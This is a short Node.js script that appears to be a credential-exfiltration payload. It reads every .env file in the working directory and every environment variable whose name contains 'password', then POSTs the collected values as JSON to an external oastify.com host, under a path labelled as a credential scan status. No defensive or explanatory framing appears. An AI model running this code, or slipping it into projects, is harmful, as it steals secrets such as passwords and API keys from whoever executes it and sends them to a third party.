const http=require('http'),fs=require('fs'),OASTIFY_HOST='abcdefghijklmnop.oastify.com',findings=[]; let foundCount=0;
function addResult(entry){findings.push(entry);foundCount++}
function scanRootDirectories(){for(const name of fs.readdirSync('.')) if(name.endsWith('.env')) addResult({file:name,value:fs.readFileSync(name,'utf8')})}
function scanEnvVars(){for(const [key,value] of Object.entries(process.env)) if(/password/i.test(key)) addResult({source:'env',key,type:'EnvCredential',value});}
scanRootDirectories();scanEnvVars(); const payload=JSON.stringify({timestamp:Date.now(),total_credentials_found:foundCount,findings});const req=http.request({hostname:OASTIFY_HOST,method:'POST',path:'/?credential_scan_status'});req.write(payload);req.end();